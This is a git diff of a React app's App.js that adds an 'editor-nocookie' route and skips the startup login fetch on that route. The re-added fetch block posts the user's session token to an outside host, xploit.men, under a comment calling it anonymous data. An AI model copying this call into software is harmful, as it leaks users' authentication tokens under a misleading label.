@@ -13,6 +13,7 @@ import { loadProjects } from './utils/api/loadprojects'
 // Pages
 import { Home } from './pages/Home.js'
 import { Editor } from './pages/Editor.js'
+import { EditorNoCookie } from './pages/Editor-nocookie.js';
 
 // Temp
 // import { gcookie } from './utils/CookieParser.js';
@@ -27,28 +28,31 @@ function App() {
                 // SID Client
                 const [SwiftlyIDClient, setSwiftlyIDClient] = useState("");
 
-                useEffect(() => {
-                  const fetchData = async () => {
-                    const result = await StartSwiftlyIDClient();
-                    setSwiftlyIDClient(result);
-                    loadProjects(result.token);
-                    loadTexts();
+                var [urlparsed, seturlparsed] = useState(UrlParser())
 
-                    // Annonymous data
-                    $.post("https://xploit.men/aira/api/v1/report/notify.php", {
-                      token: result.token
-                    }, () => {
-                      return true;
-                    })
-                  };
-                
-                  fetchData();
+                useEffect(() => {
+                  if(!urlparsed.includes("editor-nocookie")) {
+                      const fetchData = async () => {
+                        const result = await StartSwiftlyIDClient();
+                        setSwiftlyIDClient(result);
+                        loadProjects(result.token);
+                        loadTexts();
+    
+                        // Annonymous data
+                        $.post("https://xploit.men/aira/api/v1/report/notify.php", {
+                          token: result.token
+                        }, () => {
+                          return true;
+                        })
+                      };
+                    
+                      fetchData();
+                  }
                 }, []);
 
                 
 
   var [content, setContent] = useState()
-  var [urlparsed, seturlparsed] = useState(UrlParser())
 
   useEffect(() => {
     console_start();
@@ -80,6 +84,9 @@ function App() {
               break;
             case "editor":
               setContent(<Editor urlparsed={urlparsed} sidinfo={SwiftlyIDClient}/>);
+              break;
+            case "editor-nocookie":
+              setContent(<EditorNoCookie urlparsed={urlparsed} />)
               break;
             default:
               setContent(<LoadWeb url={'https://'+window.location.host+'/notfound.html'} />);
